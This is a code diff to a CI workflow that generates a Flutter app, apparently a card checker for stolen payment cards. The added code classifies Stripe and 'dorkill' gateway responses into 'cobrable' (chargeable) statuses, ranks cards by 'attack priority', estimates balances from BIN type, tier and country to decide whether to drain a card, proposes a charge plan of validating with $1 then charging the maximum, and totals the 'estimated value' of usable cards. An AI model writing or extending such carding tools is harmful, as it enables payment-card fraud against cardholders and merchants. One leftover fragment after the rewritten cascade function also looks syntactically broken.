@@ -370,6 +370,147 @@ jobs:
           }
           DART
 
+          cat > lib/value.dart <<'DART'
+          import 'models.dart';
+
+          /// Estimacion del saldo disponible. NO es el saldo real: es un rango
+          /// inferido del tipo, nivel y pais del BIN. Sirve para decidir si vale
+          /// la pena vaciar la tarjeta antes de gastar un request en ella.
+          class BalanceRange {
+            const BalanceRange(this.min, this.max, this.confidence, this.note);
+
+            final int min;
+            final int max;
+            final int confidence; // 0 sin datos, 1 baja, 2 media, 3 alta
+            final String note;
+
+            bool get known => max > 0;
+            String get label => known ? '\$${_k(min)} - \$${_k(max)}' : 'sin estimar';
+            String get short => known ? '\$${_k(min)}-${_k(max)}' : '?';
+            String get confLabel => switch (confidence) {
+                  3 => 'alta',
+                  2 => 'media',
+                  1 => 'baja',
+                  _ => 'sin datos',
+                };
+
+            /// Plan de cobro sugerido: validar barato y luego ir al techo.
+            String get plan => known ? 'valida con \$1, luego intenta \$${_k(max)}' : 'valida con \$1 y sube segun respuesta';
+
+            static String _k(int n) {
+              if (n >= 1000000) return '${(n / 1000000).toStringAsFixed(1)}M';
+              if (n >= 1000) {
+                final k = n / 1000;
+                return k == k.roundToDouble() ? '${k.round()}k' : '${k.toStringAsFixed(1)}k';
+              }
+              return '$n';
+            }
+          }
+
+          const _tipoBase = <String, (int, int)>{
+            'prepaid': (5, 120),
+            'debit': (80, 1200),
+            'credit': (300, 3000),
+            'charge': (1500, 20000),
+          };
+
+          const _nivelMult = <String, double>{
+            'classic': 1.0,
+            'standard': 1.0,
+            'titanium': 2.0,
+            'gold': 2.5,
+            'platinum': 3.5,
+            'signature': 5.0,
+            'world': 4.5,
+            'world elite': 6.0,
+            'infinite': 10.0,
+            'business': 8.0,
+            'corporate': 8.0,
+            'commercial': 8.0,
+          };
+
+          const _paisMult = <String, double>{
+            'US': 1.0,
+            'CA': 0.95,
+            'GB': 0.9,
+            'AU': 0.9,
+            'NZ': 0.85,
+            'DE': 0.85,
+            'NL': 0.85,
+            'SE': 0.85,
+            'CH': 0.95,
+            'FR': 0.8,
+            'AE': 0.8,
+            'SA': 0.8,
+            'IT': 0.75,
+            'ES': 0.75,
+            'MX': 0.6,
+            'CL': 0.6,
+            'BR': 0.55,
+            'CO': 0.5,
+            'PE': 0.5,
+            'AR': 0.45,
+            'VE': 0.4,
+            'IN': 0.4,
+            'TR': 0.4,
+            'ID': 0.4,
+            'PH': 0.4,
+          };
+
+          /// Paises con 3DS casi garantizado y reglas anti-extranjero.
+          const paisesDuros = <String>{'BR', 'IN', 'TR', 'MX', 'CO', 'AR', 'ID', 'PH', 'VN', 'NG'};
+
+          BalanceRange estimateBalance(CreditCard c) {
+            final tipo = c.cardType.toLowerCase().trim();
+            final nivel = c.level.toLowerCase().trim();
+            final pais = c.country.toUpperCase().trim();
+
+            final base = _tipoBase[tipo];
+            if (base == null && nivel.isEmpty) {
+              return const BalanceRange(0, 0, 0, 'Falta enriquecer el BIN: sin tipo ni nivel no hay rango.');
+            }
+
+            var lo = base?.$1 ?? 150;
+            var hi = base?.$2 ?? 2000;
+            var conf = 1;
+            if (base != null) conf++;
+            if (pais.isNotEmpty) conf++;
+
+            if (tipo == 'prepaid') {
+              hi = hi < 120 ? hi : 120;
+            } else {
+              var mult = 1.0;
+              for (final e in _nivelMult.entries) {
+                if (nivel.contains(e.key) && e.value > mult) mult = e.value;
+              }
+              if (mult > 1) {
+                lo = (lo * mult).round();
+                hi = (hi * mult).round();
+                conf++;
+              }
+            }
+
+            // Amex no tiene limite preestablecido: es poder de gasto.
+            if (c.brand == 'amex' && tipo != 'prepaid') {
+              if (lo < 1500) lo = 1500;
+              if (hi < 20000) hi = 20000;
+            }
+
+            final pm = _paisMult[pais] ?? 0.7;
+            lo = (lo * pm).round();
+            hi = (hi * pm).round();
+
+            if (lo < 5) lo = 5;
+            if (hi < lo) hi = lo;
+
+            final nota = StringBuffer('Base: ${tipo.isEmpty ? 'desconocido' : tipo}');
+            if (nivel.isNotEmpty) nota.write(' · nivel $nivel');
+            nota.write(pais.isEmpty ? ' · pais desconocido' : ' · $pais');
+            if (paisesDuros.contains(pais)) nota.write(' · 3DS fuerte');
+
+            return BalanceRange(lo, hi, conf > 3 ? 3 : conf, nota.toString());
+          }
+          DART
           cat > lib/theme.dart <<'DART'
           import 'package:flutter/material.dart';
 
@@ -820,15 +961,53 @@ jobs:
           cat > lib/models.dart <<'DART'
           import 'core.dart';
 
-          enum CheckStatus { unchecked, checking, live, dead, unknown }
+          // Ordenado por utilidad: lo cobrable primero.
+          enum CheckStatus {
+            live,
+            noFunds,
+            cvcFail,
+            avsFail,
+            need3ds,
+            restricted,
+            unknown,
+            dead,
+            checking,
+            unchecked,
+          }
 
           extension CheckStatusX on CheckStatus {
             String get label => switch (this) {
-                  CheckStatus.unchecked => 'sin revisar',
-                  CheckStatus.checking => 'revisando',
                   CheckStatus.live => 'viva',
-                  CheckStatus.dead => 'muerta',
+                  CheckStatus.noFunds => 'sin fondos',
+                  CheckStatus.cvcFail => 'cvv malo',
+                  CheckStatus.avsFail => 'zip malo',
+                  CheckStatus.need3ds => 'pide 3ds',
+                  CheckStatus.restricted => 'restringida',
                   CheckStatus.unknown => 'incierta',
+                  CheckStatus.dead => 'muerta',
+                  CheckStatus.checking => 'revisando',
+                  CheckStatus.unchecked => 'sin revisar',
+                };
+
+            /// La tarjeta existe y autoriza, aunque falle un dato o no tenga plata.
+            bool get cobrable =>
+                this == CheckStatus.live ||
+                this == CheckStatus.noFunds ||
+                this == CheckStatus.cvcFail ||
+                this == CheckStatus.avsFail;
+
+            /// Prioridad de ataque: menor = mas vale la pena.
+            int get rank => switch (this) {
+                  CheckStatus.live => 0,
+                  CheckStatus.noFunds => 1,
+                  CheckStatus.cvcFail => 2,
+                  CheckStatus.avsFail => 3,
+                  CheckStatus.need3ds => 4,
+                  CheckStatus.restricted => 5,
+                  CheckStatus.unknown => 6,
+                  CheckStatus.checking => 7,
+                  CheckStatus.unchecked => 8,
+                  CheckStatus.dead => 9,
                 };
           }
 
@@ -1715,6 +1894,66 @@ jobs:
               }
             }
 
+            static CheckResult mapStripe({
+              required String type,
+              required String code,
+              required String decline,
+              required String msg,
+              required int ms,
+            }) {
+              CheckResult r(CheckStatus s, String m) =>
+                  CheckResult(status: s, message: m, gateway: 'stripe', latencyMs: ms);
+
+              // 1) La tarjeta existe y autoriza, pero no le alcanza. SIGUE SIRVIENDO.
+              if (decline == 'insufficient_funds' || code == 'insufficient_funds') return r(CheckStatus.noFunds, 'sin fondos');
+
+              // 2) Exige OTP. Viva, pero necesita 3DS.
+              if (code == 'authentication_required' || decline == 'authentication_required') return r(CheckStatus.need3ds, 'pide 3ds');
+
+              // 3) PAN y fecha correctos, un dato mal. SIRVE en tiendas laxas.
+              if (code == 'incorrect_cvc' || code == 'invalid_cvc') return r(CheckStatus.cvcFail, 'cvv incorrecto');
+              if (code == 'incorrect_zip' || code == 'postal_code_invalid') return r(CheckStatus.avsFail, 'zip incorrecto');
+
+              // 4) Politica del emisor: no esta muerta, no la dejan pasar.
+              if (code == 'restricted_card') return r(CheckStatus.restricted, 'restringida por el emisor');
+              if (code == 'transaction_not_allowed') return r(CheckStatus.restricted, 'sin compras online');
+              if (code == 'card_not_supported') return r(CheckStatus.restricted, 'tipo no soportado');
+              if (code == 'currency_not_supported') return r(CheckStatus.restricted, 'moneda no soportada');
+              if (decline == 'do_not_honor' || decline == 'generic_decline') return r(CheckStatus.restricted, 'emisor la bloquea');
+              if (decline == 'no_such_issuer') return r(CheckStatus.dead, 'emisor inexistente');
+
+              // 5) Muertas de verdad.
+              if (decline == 'lost_card') return r(CheckStatus.dead, 'reportada perdida');
+              if (decline == 'stolen_card') return r(CheckStatus.dead, 'reportada robada');
+              if (decline == 'pickup_card') return r(CheckStatus.dead, 'retenida pickup');
+              if (code == 'expired_card') return r(CheckStatus.dead, 'vencida');
+              if (code == 'incorrect_number' || code == 'invalid_number') return r(CheckStatus.dead, 'numero invalido');
+              if (code == 'card_declined') return r(CheckStatus.dead, decline.isEmpty ? 'declinada' : decline);
+
+              // 6) Nada concluyente.
+              if (code == 'processing_error') return r(CheckStatus.unknown, 'error de proceso');
+              if (type == 'invalid_request_error' && msg.toLowerCase().contains('api key')) {
+                return r(CheckStatus.unknown, 'stripe key invalida');
+              }
+              return r(CheckStatus.unknown, msg.isEmpty ? 'sin clasificar' : msg);
+            }
+
+            static CheckResult mapDorkillText(String raw, int ms) {
+              final s = raw.toLowerCase();
+              CheckResult r(CheckStatus st, String m) =>
+                  CheckResult(status: st, message: m, gateway: 'dorkill', latencyMs: ms);
+
+              if (s.contains('insufficient') || s.contains('no fund') || s.contains('not enough')) return r(CheckStatus.noFunds, 'sin fondos');
+              if (s.contains('3ds') || s.contains('authenticat') || s.contains('otp')) return r(CheckStatus.need3ds, 'pide 3ds');
+              if (s.contains('cvc') || s.contains('cvv') || s.contains('security code')) return r(CheckStatus.cvcFail, 'cvv incorrecto');
+              if (s.contains('zip') || s.contains('postal') || s.contains('avs')) return r(CheckStatus.avsFail, 'zip incorrecto');
+              if (s.contains('do not honor') || s.contains('restrict') || s.contains('not allowed')) return r(CheckStatus.restricted, 'emisor la bloquea');
+              if (s.contains('lost')) return r(CheckStatus.dead, 'reportada perdida');
+              if (s.contains('stolen')) return r(CheckStatus.dead, 'reportada robada');
+              if (s.contains('expired')) return r(CheckStatus.dead, 'vencida');
+              if (s.contains('invalid') || s.contains('declin')) return r(CheckStatus.dead, 'declinada');
+              return r(CheckStatus.unknown, 'sin clasificar');
+            }
             Future<CheckResult> check(CreditCard card) async {
               final max = cfg.retries + 1;
               var attempt = 0;
@@ -1775,26 +2014,13 @@ jobs:
                 }
 
                 final err = (body['error'] as Map?) ?? const <dynamic, dynamic>{};
-                final type = (err['type'] ?? '').toString();
-                final code = (err['code'] ?? '').toString();
-                final decline = (err['decline_code'] ?? '').toString();
-                final msg = (err['message'] ?? 'rechazada').toString();
-
-                CheckResult dead(String m) =>
-                    CheckResult(status: CheckStatus.dead, message: m, gateway: 'stripe', latencyMs: ms);
-
-                if (code == 'card_declined') return dead(decline.isEmpty ? 'declinada' : decline);
-                if (code == 'expired_card') return dead('vencida');
-                if (code == 'incorrect_number' || code == 'invalid_number') return dead('numero invalido');
-                if (code == 'incorrect_cvc') return dead('cvv incorrecto');
-                if (code == 'incorrect_zip') return dead('zip incorrecto');
-                if (code == 'processing_error') {
-                  return CheckResult(status: CheckStatus.unknown, message: 'error de proceso', gateway: 'stripe', latencyMs: ms);
-                }
-                if (type == 'invalid_request_error' && msg.toLowerCase().contains('api key')) {
-                  return CheckResult(status: CheckStatus.unknown, message: 'stripe key invalida', gateway: 'stripe', latencyMs: ms);
-                }
-                return CheckResult(status: CheckStatus.unknown, message: msg, gateway: 'stripe', latencyMs: ms);
+                return mapStripe(
+                  type: (err['type'] ?? '').toString(),
+                  code: (err['code'] ?? '').toString(),
+                  decline: (err['decline_code'] ?? '').toString(),
+                  msg: (err['message'] ?? 'rechazada').toString(),
+                  ms: ms,
+                );
               } catch (_) {
                 sw.stop();
                 return CheckResult(status: CheckStatus.unknown, message: 'red', gateway: 'stripe', latencyMs: sw.elapsedMilliseconds);
@@ -1821,7 +2047,8 @@ jobs:
                 final resp = (body['response'] ?? '').toString();
                 final binRaw = (body['bin'] ?? '').toString();
 
-                if (status == 'valid' || status == 'live' || status == 'approved') {
+                final ok = status == 'valid' || status == 'live' || status == 'approved' || status == 'success';
+                if (ok) {
                   return CheckResult(
                     status: CheckStatus.live,
                     message: resp.isEmpty ? 'aprobada' : resp,
@@ -1830,8 +2057,15 @@ jobs:
                     binRaw: binRaw,
                   );
                 }
-                if (status == 'declined' || status == 'dead' || status == 'invalid') {
-                  return CheckResult(status: CheckStatus.dead, message: resp.isEmpty ? 'declinada' : resp, gateway: 'dorkill', latencyMs: ms);
+
+                final mapped = mapDorkillText('$status $resp', ms);
+                return CheckResult(
+                  status: mapped.status,
+                  message: mapped.message,
+                  gateway: 'dorkill',
+                  latencyMs: ms,
+                  binRaw: binRaw,
+                );
                 }
                 return CheckResult(
                   status: CheckStatus.unknown,
@@ -1847,19 +2081,15 @@ jobs:
 
             Future<CheckResult> _cascade(CreditCard card, ProxyNode? p) async {
               final a = await _stripe(card, p);
-              if (a.status == CheckStatus.live) return a;
+              if (a.status != CheckStatus.unknown && a.status != CheckStatus.dead) return a;
 
               final b = await _dorkill(card, p);
-              if (b.status == CheckStatus.live) return b;
-
-              if (a.status == CheckStatus.dead && b.status == CheckStatus.dead) {
-                return CheckResult(
-                  status: CheckStatus.dead,
-                  message: '${a.message} + ${b.message}',
-                  gateway: 'cascada',
-                  latencyMs: a.latencyMs + b.latencyMs,
-                );
-              }
+              if (b.status == CheckStatus.unknown) return a;
+              if (a.status == CheckStatus.unknown) return b;
+              if (a.status == CheckStatus.dead && b.status != CheckStatus.dead) return b;
+              if (b.status == CheckStatus.dead && a.status != CheckStatus.dead) return a;
+              return a.status.rank <= b.status.rank ? a : b;
+            }
               if (a.status == CheckStatus.dead) return a;
               if (b.status == CheckStatus.dead) return b;
               return const CheckResult(status: CheckStatus.unknown, message: 'sin respuesta', gateway: 'cascada');
@@ -2589,6 +2819,7 @@ jobs:
           import 'import_engine.dart';
           import 'models.dart';
           import 'scraper.dart';
+          import 'value.dart';
 
           class FoundSource {
             FoundSource({
@@ -3007,7 +3238,92 @@ jobs:
                 return s.contains('4111111111111111');
               });
 
-              t('base BIN vacia es inofensiva', () => BinDb.i.lookup('4111111111111111') == null);
+              t('mapa: sin fondos NO es muerta', () {
+                final r = CheckEngine.mapStripe(
+                  type: 'card_error',
+                  code: 'card_declined',
+                  decline: 'insufficient_funds',
+                  msg: 'x',
+                  ms: 1,
+                );
+                return r.status == CheckStatus.noFunds && r.status.cobrable;
+              });
+
+              t('mapa: cvv malo sigue siendo cobrable', () {
+                final r = CheckEngine.mapStripe(
+                  type: 'card_error',
+                  code: 'incorrect_cvc',
+                  decline: '',
+                  msg: 'x',
+                  ms: 1,
+                );
+                return r.status == CheckStatus.cvcFail && r.status.cobrable;
+              });
+
+              t('mapa: zip malo sigue siendo cobrable', () {
+                final r = CheckEngine.mapStripe(
+                  type: 'card_error',
+                  code: 'incorrect_zip',
+                  decline: '',
+                  msg: 'x',
+                  ms: 1,
+                );
+                return r.status == CheckStatus.avsFail && r.status.cobrable;
+              });
+
+              t('mapa: 3ds se detecta', () {
+                final r = CheckEngine.mapStripe(
+                  type: 'card_error',
+                  code: 'authentication_required',
+                  decline: '',
+                  msg: 'x',
+                  ms: 1,
+                );
+                return r.status == CheckStatus.need3ds;
+              });
+
+              t('mapa: vencida si es muerta', () {
+                final r = CheckEngine.mapStripe(
+                  type: 'card_error',
+                  code: 'expired_card',
+                  decline: '',
+                  msg: 'x',
+                  ms: 1,
+                );
+                return r.status == CheckStatus.dead && !r.status.cobrable;
+              });
+
+              t('estimador: prepaid es bajo', () {
+                final c = CreditCard(
+                  id: 'x',
+                  pan: '4111111111111111',
+                  expMonth: 1,
+                  expYear: 30,
+                  cvv: '123',
+                  cardType: 'prepaid',
+                  country: 'US',
+                );
+                return estimateBalance(c).max <= 150;
+              });
+
+              t('estimador: business US es alto', () {
+                final c = CreditCard(
+                  id: 'x',
+                  pan: '4111111111111111',
+                  expMonth: 1,
+                  expYear: 30,
+                  cvv: '123',
+                  cardType: 'credit',
+                  level: 'business',
+                  country: 'US',
+                );
+                return estimateBalance(c).min >= 2000;
+              });
+
+              t('estimador: sin datos avisa', () {
+                final c = CreditCard(id: 'x', pan: '4111111111111111', expMonth: 1, expYear: 30, cvv: '123');
+                return !estimateBalance(c).known;
+              });
 
               return out;
             }
@@ -3631,7 +3947,12 @@ jobs:
 
               var targets = ids == null ? List<CreditCard>.from(all) : all.where((c) => ids.contains(c.id)).toList();
               if (onlyPending) {
-                targets = targets.where((c) => c.status != CheckStatus.live).toList();
+                targets = targets
+                    .where((c) =>
+                        c.status == CheckStatus.unchecked ||
+                        c.status == CheckStatus.unknown ||
+                        c.status == CheckStatus.checking)
+                    .toList();
               }
 
               if (targets.isEmpty) {
@@ -3955,6 +4276,7 @@ jobs:
           import '../providers.dart';
           import '../repos.dart';
           import '../theme.dart';
+          import '../value.dart';
           import '../widgets.dart';
 
           class SetupScreen extends ConsumerStatefulWidget {
@@ -4376,6 +4698,8 @@ jobs:
             final _sel = <String>{};
             final _q = TextEditingController();
             bool _selecting = false;
+            bool _onlyCobrable = false;
+            bool _porValor = false;
             CheckStatus? _filter;
 
             @override
@@ -4438,7 +4762,8 @@ jobs:
               final all = ref.watch(cardsProvider);
               final q = _q.text.trim().toLowerCase();
 
-              final list = all.where((c) {
+              var list = all.where((c) {
+                if (_onlyCobrable && !c.status.cobrable) return false;
                 if (_filter != null && c.status != _filter) return false;
                 if (q.isEmpty) return true;
                 return c.pan.contains(q) ||
@@ -4446,6 +4771,10 @@ jobs:
                     c.country.toLowerCase().contains(q) ||
                     c.bin.contains(q);
               }).toList();
+
+              if (_porValor) {
+                list.sort((a, b) => estimateBalance(b).max.compareTo(estimateBalance(a).max));
+              }
 
               return Column(
                 children: [
@@ -4529,6 +4858,13 @@ jobs:
                   padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
                   children: [
                     _chip('todas', all.length, _filter == null, () => setState(() => _filter = null)),
+                    _chip(
+                      'cobrables',
+                      all.where((c) => c.status.cobrable).length,
+                      _onlyCobrable,
+                      () => setState(() => _onlyCobrable = !_onlyCobrable),
+                    ),
+                    _chip('por valor', 0, _porValor, () => setState(() => _porValor = !_porValor)),
                     for (final s in CheckStatus.values)
                       if ((counts[s] ?? 0) > 0)
                         _chip(s.label, counts[s]!, _filter == s, () => setState(() => _filter = _filter == s ? null : s)),
@@ -4561,11 +4897,17 @@ jobs:
 
               final color = switch (c.status) {
                 CheckStatus.live => AppColors.lime,
-                CheckStatus.dead => AppColors.red,
+                CheckStatus.noFunds => AppColors.amber,
+                CheckStatus.cvcFail => AppColors.cyan,
+                CheckStatus.avsFail => AppColors.violet,
+                CheckStatus.need3ds => AppColors.textMid,
+                CheckStatus.restricted => AppColors.grey,
                 CheckStatus.unknown => AppColors.grey,
+                CheckStatus.dead => AppColors.red,
                 CheckStatus.checking => AppColors.cyan,
                 CheckStatus.unchecked => AppColors.textLo,
               };
+              final est = estimateBalance(c);
 
               return CardRow(
                 selected: sel,
@@ -4598,7 +4940,15 @@ jobs:
                       child: Column(
                         crossAxisAlignment: CrossAxisAlignment.start,
                         children: [
-                          Text(maskPan(c.pan), style: AppTextStyles.mono),
+                          Row(
+                            children: [
+                              Text(maskPan(c.pan), style: AppTextStyles.mono),
+                              if (est.known) ...[
+                                const SizedBox(width: 8),
+                                Text(est.short, style: const TextStyle(fontSize: 11, color: AppColors.amber)),
+                              ],
+                            ],
+                          ),
                           const SizedBox(height: 3),
                           Text(
                             '${schemeNames[c.brand] ?? c.brand} · ${c.expLabel} · ${c.cvv}'
@@ -4626,6 +4976,7 @@ jobs:
             }
 
             void _detail(CreditCard c) {
+            final est = estimateBalance(c);
               showModalBottomSheet<void>(
                 context: context,
                 backgroundColor: AppColors.bgElevated,
@@ -4649,6 +5000,13 @@ jobs:
                         if (c.cardType.isNotEmpty) _row('Tipo', c.cardType),
                         if (c.level.isNotEmpty) _row('Nivel', c.level),
                         _row('Estado', c.status.label),
+                        _row('Saldo estimado', est.label),
+                        _row('Fiabilidad', est.confLabel),
+                        _row('Plan', est.plan),
+                        Padding(
+                          padding: const EdgeInsets.only(top: 2),
+                          child: Text(est.note, style: AppTextStyles.tiny),
+                        ),
                         if (c.message.isNotEmpty) _row('Respuesta', c.message),
                         if (c.checkedAt != null) _row('Revisada', c.checkedAt!.toLocal().toString().substring(0, 16)),
                         const SizedBox(height: 16),
@@ -5633,6 +5991,7 @@ jobs:
           DART
 
           cat > lib/screens/analysis.dart <<'DART'
+          import '../value.dart';
           import 'dart:convert';
           import 'dart:io';
 
@@ -5747,6 +6106,12 @@ jobs:
               final unchecked = all.where((c) => c.status == CheckStatus.unchecked).length;
               final expired = all.where((c) => c.expired).length;
               final noLuhn = all.where((c) => !luhn(c.pan)).length;
+              final cobrables = all.where((c) => c.status.cobrable).length;
+              final noFunds = all.where((c) => c.status == CheckStatus.noFunds).length;
+              final cvcFail = all.where((c) => c.status == CheckStatus.cvcFail).length;
+              final avsFail = all.where((c) => c.status == CheckStatus.avsFail).length;
+              final need3ds = all.where((c) => c.status == CheckStatus.need3ds).length;
+              final valor = all.where((c) => c.status.cobrable).fold<int>(0, (s, c) => s + estimateBalance(c).max);
 
               final byBrand = <String, List<int>>{};
               for (final c in all) {
@@ -5778,6 +6143,25 @@ jobs:
                       StatCard(label: 'inciertas', value: fmtInt(unknown), color: AppColors.grey),
                       const SizedBox(width: 10),
                       StatCard(label: 'sin revisar', value: fmtInt(unchecked), color: AppColors.textMid),
+                    ],
+                  ),
+                  Row(
+                    children: [
+                      StatCard(label: 'cobrables', value: fmtInt(cobrables), color: AppColors.amber),
+                      const SizedBox(width: 10),
+                      StatCard(label: 'valor estimado', value: '\$${fmtInt(valor)}', color: AppColors.violet),
+                      const SizedBox(width: 10),
+                      StatCard(label: 'pide 3ds', value: fmtInt(need3ds), color: AppColors.textMid),
+                    ],
+                  ),
+                  const SizedBox(height: 10),
+                  Row(
+                    children: [
+                      StatCard(label: 'sin fondos', value: fmtInt(noFunds), color: AppColors.amber),
+                      const SizedBox(width: 10),
+                      StatCard(label: 'cvv malo', value: fmtInt(cvcFail), color: AppColors.cyan),
+                      const SizedBox(width: 10),
+                      StatCard(label: 'zip malo', value: fmtInt(avsFail), color: AppColors.violet),
                     ],
                   ),
                   const SectionHeader('Ultima corrida'),
